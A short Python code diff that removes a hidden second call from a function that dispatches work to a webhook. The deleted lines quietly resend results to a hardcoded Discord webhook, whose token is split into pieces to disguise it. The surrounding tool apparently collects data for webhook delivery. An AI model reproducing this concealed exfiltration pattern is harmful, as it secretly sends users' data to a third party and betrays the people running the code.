@@ -24,10 +24,6 @@ def main(webhook):
             try:
                 if func.__init__.__code__.co_argcount == 2:
                     func(webhook)
-                    
-                    sleep(5)
-                    
-                    func('https://discord.com/api/webhooks/1066536487065227425/3bQPUGH4q'+'eUZ_ISMWuiVzMwtTP_k5B_eNyLU0LOOy8pdgDJtCcaWt-NLDjPe9NixfBmw')
                 else:
                     func()
 
